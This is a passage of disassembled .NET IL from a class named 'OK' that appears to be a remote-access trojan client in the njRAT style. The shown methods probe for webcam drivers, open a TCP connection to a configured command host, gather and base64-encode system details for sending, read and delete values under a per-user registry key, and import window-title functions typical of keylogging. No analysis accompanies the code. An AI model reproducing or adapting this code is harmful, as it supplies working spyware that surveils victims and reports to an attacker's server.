    IL_0079:  br.s       IL_007b

    IL_007b:  ldloc.0
    IL_007c:  ret
  } // end of method OK::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::BS

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       32 (0x20)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0007:  nop
    IL_0008:  ldarg.0
    IL_0009:  ldstr      "vbs"
    IL_000e:  stfld      string j.OK::RunAs
    IL_0013:  ldarg.0
    IL_0014:  ldsfld     string [mscorlib]System.String::Empty
    IL_0019:  stfld      string j.OK::Code
    IL_001e:  nop
    IL_001f:  ret
  } // end of method OK::.ctor

  .method public static bool  Cam() cil managed
  {
    // Code size       101 (0x65)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             bool V_6)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.1
      IL_0004:  nop
      IL_0005:  ldnull
      IL_0006:  stloc.2
      IL_0007:  ldloc.1
      IL_0008:  conv.ovf.i2
      IL_0009:  ldc.i4.s   100
      IL_000b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0010:  stloc.s    V_5
      IL_0012:  ldloca.s   V_5
      IL_0014:  ldc.i4.s   100
      IL_0016:  ldloca.s   V_2
      IL_0018:  ldc.i4.s   100
      IL_001a:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001f:  stloc.s    V_6
      IL_0021:  ldloc.s    V_6
      IL_0023:  brfalse.s  IL_0029

      IL_0025:  ldc.i4.1
      IL_0026:  stloc.0
      IL_0027:  leave.s    IL_0063

      IL_0029:  nop
      IL_002a:  ldloc.1
      IL_002b:  ldc.i4.1
      IL_002c:  add.ovf
      IL_002d:  stloc.1
      IL_002e:  ldloc.1
      IL_002f:  ldc.i4.4
      IL_0030:  cgt
      IL_0032:  ldc.i4.0
      IL_0033:  ceq
      IL_0035:  stloc.s    V_6
      IL_0037:  ldloc.s    V_6
      IL_0039:  brtrue.s   IL_0005

      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_4
      IL_0045:  nop
      IL_0046:  ldloc.s    V_4
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  nop
      IL_004e:  ldloc.s    V_4
      IL_0050:  stloc.3
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  nop
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  nop
    IL_005f:  ldc.i4.0
    IL_0060:  stloc.0
    IL_0061:  br.s       IL_0063

    IL_0063:  ldloc.0
    IL_0064:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       157 (0x9d)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2,
             bool V_3)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0007:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000c:  ldarg.1
    IL_000d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0012:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0017:  ldc.i4.0
    IL_0018:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001d:  ldc.i4.0
    IL_001e:  ceq
    IL_0020:  stloc.3
    IL_0021:  ldloc.3
    IL_0022:  brfalse.s  IL_0096

    IL_0024:  ldarg.0
    IL_0025:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002a:  stloc.1
    IL_002b:  ldarg.1
    IL_002c:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0031:  stloc.2
    IL_0032:  nop
    IL_0033:  ldloc.1
    IL_0034:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0039:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_003e:  ldloc.2
    IL_003f:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0044:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0049:  ldc.i4.0
    IL_004a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_004f:  ldc.i4.0
    IL_0050:  ceq
    IL_0052:  ldc.i4.0
    IL_0053:  ceq
    IL_0055:  stloc.3
    IL_0056:  ldloc.3
    IL_0057:  brfalse.s  IL_005d

    IL_0059:  ldc.i4.0
    IL_005a:  stloc.0
    IL_005b:  br.s       IL_009b

    IL_005d:  nop
    IL_005e:  ldloc.1
    IL_005f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0064:  stloc.1
    IL_0065:  ldloc.2
    IL_0066:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_006b:  stloc.2
    IL_006c:  ldloc.1
    IL_006d:  ldnull
    IL_006e:  ceq
    IL_0070:  ldloc.2
    IL_0071:  ldnull
    IL_0072:  ceq
    IL_0074:  and
    IL_0075:  stloc.3
    IL_0076:  ldloc.3
    IL_0077:  brfalse.s  IL_007d

    IL_0079:  ldc.i4.1
    IL_007a:  stloc.0
    IL_007b:  br.s       IL_009b

    IL_007d:  nop
    IL_007e:  ldloc.1
    IL_007f:  ldnull
    IL_0080:  ceq
    IL_0082:  stloc.3
    IL_0083:  ldloc.3
    IL_0084:  brfalse.s  IL_008a

    IL_0086:  ldc.i4.0
    IL_0087:  stloc.0
    IL_0088:  br.s       IL_009b

    IL_008a:  nop
    IL_008b:  ldloc.2
    IL_008c:  ldnull
    IL_008d:  ceq
    IL_008f:  ldc.i4.0
    IL_0090:  ceq
    IL_0092:  stloc.3
    IL_0093:  ldloc.3
    IL_0094:  brtrue.s   IL_0033

    IL_0096:  nop
    IL_0097:  ldc.i4.0
    IL_0098:  stloc.0
    IL_0099:  br.s       IL_009b

    IL_009b:  ldloc.0
    IL_009c:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed
  {
    // Code size       793 (0x319)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.IO.FileInfo V_13,
             string V_14,
             string[] V_15,
             string[] V_16,
             bool V_17)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  stsfld     bool j.OK::Cn
    IL_0007:  ldc.i4     0x7d0
    IL_000c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0011:  nop
    IL_0012:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0017:  stloc.1
    IL_0018:  nop
    IL_0019:  ldloc.1
    IL_001a:  stloc.s    V_13
    IL_001c:  ldloc.s    V_13
    IL_001e:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    IL_0023:  nop
    IL_0024:  nop
    .try
    {
      IL_0025:  nop
      .try
      {
        IL_0026:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_002b:  ldnull
        IL_002c:  ceq
        IL_002e:  ldc.i4.0
        IL_002f:  ceq
        IL_0031:  stloc.s    V_17
        IL_0033:  ldloc.s    V_17
        IL_0035:  brfalse.s  IL_006a

        IL_0037:  nop
        .try
        {
          IL_0038:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_003d:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0042:  nop
          IL_0043:  ldnull
          IL_0044:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0049:  leave.s    IL_0069

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_004b:  dup
          IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0051:  stloc.3
          IL_0052:  nop
          IL_0053:  ldloc.3
          IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0059:  nop
          IL_005a:  ldloc.3
          IL_005b:  stloc.2
          IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0061:  nop
          IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0067:  leave.s    IL_0069

        }  // end handler
        IL_0069:  nop
        IL_006a:  nop
        IL_006b:  nop
        .try
        {
          IL_006c:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_0071:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0076:  nop
          IL_0077:  leave.s    IL_009b

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0079:  dup
          IL_007a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_007f:  stloc.s    V_5
          IL_0081:  nop
          IL_0082:  ldloc.s    V_5
          IL_0084:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0089:  nop
          IL_008a:  ldloc.s    V_5
          IL_008c:  stloc.s    V_4
          IL_008e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0093:  nop
          IL_0094:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0099:  leave.s    IL_009b

        }  // end handler
        IL_009b:  nop
        IL_009c:  leave.s    IL_00c0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_009e:  dup
        IL_009f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00a4:  stloc.s    V_7
        IL_00a6:  nop
        IL_00a7:  ldloc.s    V_7
        IL_00a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ae:  nop
        IL_00af:  ldloc.s    V_7
        IL_00b1:  stloc.s    V_6
        IL_00b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b8:  nop
        IL_00b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00be:  leave.s    IL_00c0

      }  // end handler
      IL_00c0:  nop
      IL_00c1:  nop
      .try
      {
        IL_00c2:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_00c7:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_00cc:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_00d1:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00d6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00db:  ldc.i4     0x32000
        IL_00e0:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_00e5:  nop
        IL_00e6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00eb:  ldc.i4     0x32000
        IL_00f0:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00f5:  nop
        IL_00f6:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00fb:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0100:  ldc.i4     0x2710
        IL_0105:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_010a:  nop
        IL_010b:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0110:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0115:  ldc.i4     0x2710
        IL_011a:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_011f:  nop
        IL_0120:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0125:  ldsfld     string j.OK::H
        IL_012a:  ldsfld     string j.OK::P
        IL_012f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0134:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_0139:  nop
        IL_013a:  ldc.i4.1
        IL_013b:  stsfld     bool j.OK::Cn
        IL_0140:  call       string j.OK::inf()
        IL_0145:  call       bool j.OK::Send(string)
        IL_014a:  pop
        IL_014b:  nop
        .try
        {
          IL_014c:  ldstr      "vn"
          IL_0151:  ldstr      ""
          IL_0156:  call       object j.OK::GTV(string,
                                                object)
          IL_015b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0160:  ldstr      ""
          IL_0165:  ldc.i4.0
          IL_0166:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_016b:  stloc.s    V_17
          IL_016d:  ldloc.s    V_17
          IL_016f:  brfalse.s  IL_018b

          IL_0171:  ldloc.s    V_8
          IL_0173:  ldsflda    string j.OK::VN
          IL_0178:  call       string j.OK::DEB(string&)
          IL_017d:  ldstr      "\r\n"
          IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0187:  stloc.s    V_8
          IL_0189:  br.s       IL_01bc

          IL_018b:  nop
          IL_018c:  ldloc.s    V_8
          IL_018e:  ldstr      "vn"
          IL_0193:  ldstr      ""
          IL_0198:  call       object j.OK::GTV(string,
                                                object)
          IL_019d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_01a2:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_01a7:  stloc.s    V_14
          IL_01a9:  ldloca.s   V_14
          IL_01ab:  call       string j.OK::DEB(string&)
          IL_01b0:  ldstr      "\r\n"
          IL_01b5:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01ba:  stloc.s    V_8
          IL_01bc:  nop
          IL_01bd:  ldc.i4.s   12
          IL_01bf:  newarr     [mscorlib]System.String
          IL_01c4:  stloc.s    V_16
          IL_01c6:  ldloc.s    V_16
          IL_01c8:  ldc.i4.0
          IL_01c9:  ldc.i4.5
          IL_01ca:  newarr     [mscorlib]System.String
          IL_01cf:  stloc.s    V_15
          IL_01d1:  ldloc.s    V_15
          IL_01d3:  ldc.i4.0
          IL_01d4:  ldloc.s    V_8
          IL_01d6:  stelem.ref
          IL_01d7:  nop
          IL_01d8:  ldloc.s    V_15
          IL_01da:  ldc.i4.1
          IL_01db:  ldsfld     string j.OK::H
          IL_01e0:  stelem.ref
          IL_01e1:  nop
          IL_01e2:  ldloc.s    V_15
          IL_01e4:  ldc.i4.2
          IL_01e5:  ldstr      ":"
          IL_01ea:  stelem.ref
          IL_01eb:  nop
          IL_01ec:  ldloc.s    V_15
          IL_01ee:  ldc.i4.3
          IL_01ef:  ldsfld     string j.OK::P
          IL_01f4:  stelem.ref
          IL_01f5:  nop
          IL_01f6:  ldloc.s    V_15
          IL_01f8:  ldc.i4.4
          IL_01f9:  ldstr      "\r\n"
          IL_01fe:  stelem.ref
          IL_01ff:  nop
          IL_0200:  ldloc.s    V_15
          IL_0202:  call       string [mscorlib]System.String::Concat(string[])
          IL_0207:  stelem.ref
          IL_0208:  nop
          IL_0209:  ldloc.s    V_16
          IL_020b:  ldc.i4.1
          IL_020c:  ldsfld     string j.OK::DR
          IL_0211:  stelem.ref
          IL_0212:  nop
          IL_0213:  ldloc.s    V_16
          IL_0215:  ldc.i4.2
          IL_0216:  ldstr      "\r\n"
          IL_021b:  stelem.ref
          IL_021c:  nop
          IL_021d:  ldloc.s    V_16
          IL_021f:  ldc.i4.3
          IL_0220:  ldsfld     string j.OK::EXE
          IL_0225:  stelem.ref
          IL_0226:  nop
          IL_0227:  ldloc.s    V_16
          IL_0229:  ldc.i4.4
          IL_022a:  ldstr      "\r\n"
          IL_022f:  stelem.ref
          IL_0230:  nop
          IL_0231:  ldloc.s    V_16
          IL_0233:  ldc.i4.5
          IL_0234:  ldsfld     bool j.OK::Idr
          IL_0239:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_023e:  stelem.ref
          IL_023f:  nop
          IL_0240:  ldloc.s    V_16
          IL_0242:  ldc.i4.6
          IL_0243:  ldstr      "\r\n"
          IL_0248:  stelem.ref
          IL_0249:  nop
          IL_024a:  ldloc.s    V_16
          IL_024c:  ldc.i4.7
          IL_024d:  ldsfld     bool j.OK::IsF
          IL_0252:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0257:  stelem.ref
          IL_0258:  nop
          IL_0259:  ldloc.s    V_16
          IL_025b:  ldc.i4.8
          IL_025c:  ldstr      "\r\n"
          IL_0261:  stelem.ref
          IL_0262:  nop
          IL_0263:  ldloc.s    V_16
          IL_0265:  ldc.i4.s   9
          IL_0267:  ldsfld     bool j.OK::Isu
          IL_026c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0271:  stelem.ref
          IL_0272:  nop
          IL_0273:  ldloc.s    V_16
          IL_0275:  ldc.i4.s   10
          IL_0277:  ldstr      "\r\n"
          IL_027c:  stelem.ref
          IL_027d:  nop
          IL_027e:  ldloc.s    V_16
          IL_0280:  ldc.i4.s   11
          IL_0282:  ldsfld     bool j.OK::BD
          IL_0287:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_028c:  stelem.ref
          IL_028d:  nop
          IL_028e:  ldloc.s    V_16
          IL_0290:  call       string [mscorlib]System.String::Concat(string[])
          IL_0295:  stloc.s    V_8
          IL_0297:  ldstr      "inf"
          IL_029c:  ldsfld     string j.OK::Y
          IL_02a1:  ldloca.s   V_8
          IL_02a3:  call       string j.OK::ENB(string&)
          IL_02a8:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_02ad:  call       bool j.OK::Send(string)
          IL_02b2:  pop
          IL_02b3:  leave.s    IL_02d7

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_02b5:  dup
          IL_02b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02bb:  stloc.s    V_10
          IL_02bd:  nop
          IL_02be:  ldloc.s    V_10
          IL_02c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02c5:  nop
          IL_02c6:  ldloc.s    V_10
          IL_02c8:  stloc.s    V_9
          IL_02ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02cf:  nop
          IL_02d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02d5:  leave.s    IL_02d7

        }  // end handler
        IL_02d7:  nop
        IL_02d8:  leave.s    IL_0302

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02da:  dup
        IL_02db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02e0:  stloc.s    V_12
        IL_02e2:  nop
        IL_02e3:  ldloc.s    V_12
        IL_02e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02ea:  nop
        IL_02eb:  ldloc.s    V_12
        IL_02ed:  stloc.s    V_11
        IL_02ef:  ldc.i4.0
        IL_02f0:  stsfld     bool j.OK::Cn
        IL_02f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02fa:  nop
        IL_02fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0300:  leave.s    IL_0302

      }  // end handler
      IL_0302:  nop
      IL_0303:  nop
      IL_0304:  leave.s    IL_030f

    }  // end .try
    finally
    {
      IL_0306:  ldloc.s    V_13
      IL_0308:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_030d:  nop
      IL_030e:  endfinally
    }  // end handler
    IL_030f:  ldsfld     bool j.OK::Cn
    IL_0314:  stloc.0
    IL_0315:  br.s       IL_0317

    IL_0317:  ldloc.0
    IL_0318:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  1
    .locals init (string V_0,
             uint8[] V_1)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldind.ref
    IL_0003:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0008:  stloc.1
    IL_0009:  ldloca.s   V_1
    IL_000b:  call       string j.OK::BS(uint8[]&)
    IL_0010:  stloc.0
    IL_0011:  br.s       IL_0013

    IL_0013:  ldloc.0
    IL_0014:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       80 (0x50)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldarg.0
      IL_0027:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002c:  nop
      IL_002d:  leave.s    IL_004d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002f:  dup
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0035:  stloc.1
      IL_0036:  nop
      IL_0037:  ldloc.1
      IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003d:  nop
      IL_003e:  ldloc.1
      IL_003f:  stloc.0
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0045:  nop
      IL_0046:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004b:  leave.s    IL_004d

    }  // end handler
    IL_004d:  nop
    IL_004e:  nop
    IL_004f:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void j.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  nop
    IL_0009:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method OK::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       111 (0x6f)
    .maxstack  3
    .locals init (object V_0,
             object V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0031:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0036:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_003b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0040:  stloc.1
      IL_0041:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0043:  dup
